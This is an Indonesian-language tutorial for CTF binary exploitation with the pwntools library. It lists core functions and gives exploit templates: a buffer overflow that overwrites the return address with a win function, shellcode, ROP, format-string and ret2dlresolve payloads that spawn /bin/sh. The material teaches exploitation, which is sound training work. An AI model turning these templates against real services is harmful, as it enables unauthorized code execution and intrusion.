#tools

pwntools adalah **library exploit Python** - senjata utama PWN. Semua payload di materi ini ditulis dengan pwntools.

## Instalasi

```bash
pip3 install pwntools
# di Kali sudah include
```

## Struktur dasar exploit

```python
from pwn import *

context.binary = elf = ELF("./chall")   # load binary
context.log_level = "info"              # atau "debug"

io = process("./chall")                 # local
# io = remote("host.ctf.com", 1337)     # remote
# io = gdb.debug("./chall")             # jalan di gdb

io.sendlineafter(b": ", payload)        # kirim setelah prompt
io.recvline()                           # terima baris
io.interactive()                        # mode interaktif (shell)
```

## Fungsi yang paling sering dipakai

```python
# Packing / unpacking alamat
p64(0x401236)      # b'\x36\x12\x40\x00\x00\x00\x00\x00'
p32(0x401236)
u64(b"\x36\x12\x40\x00\x00\x00\x00\x00")   # 0x401236
u32(...)

# ELF
elf.sym["win"]     # alamat fungsi
elf.plt["puts"]    # alamat PLT
elf.got["puts"]    # alamat GOT
elf.bss()          # alamat .bss
elf.search(b"/bin/sh")   # cari string

# Interaksi
io.sendline(data)
io.send(data)
io.recvline()
io.recvuntil(b": ")
io.recv(n)
io.recvall()
io.interactive()
io.close()

# Pattern (cari offset)
cyclic(200)
cyclic_find(0x6161616c)    # offset dari nilai crash
io.corefile.fault_addr     # alamat yang menimpa RIP saat crash

# ROP
rop = ROP(elf)
rop.system(binsh)
rop.chain()

# Shellcode
asm(shellcraft.sh())
asm(shellcraft.cat("flag.txt"))
disasm(bytes)

# Misc
context.arch = "amd64"
context.log_level = "debug"     # lihat semua send/recv
```

## Contoh lengkap

```python
from pwn import *

context.binary = elf = ELF("./chall")
io = process("./chall")
# io = remote("host.ctf.com", 1337)

offset = cyclic_find(io.corefile.fault_addr)  # 72
payload = b"A" * offset + p64(elf.sym.win)

io.sendlineafter(b": ", payload)
io.interactive()
```

## Fitur canggih

```python
# fmtstr_payload - format string write
payload = fmtstr_payload(6, {elf.got.puts: system})

# SigreturnFrame - SROP
frame = SigreturnFrame()
frame.rip = system

# Ret2dlresolvePayload - ret2dlresolve
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

# asm/objdump
print(asm("mov rax, 59; syscall"))
print(disasm(b"\x48\x31\xf6"))

# ELF libc
libc = ELF("./libc.so.6")
libc.address = leak - libc.sym.puts
```

## Tips

1. `context.binary = ELF(...)` otomatis set arch - jangan lupa.
2. `context.log_level = "debug"` saat exploit gagal - lihat apa yang sebenarnya terkirim/terima.
3. `io.corefile` butuh core dump aktif: `ulimit -c unlimited`.
4. Ganti `process()` → `remote()` dengan satu baris - sama saja.
5. Selalu cek `io.interactive()` untuk mode shell.
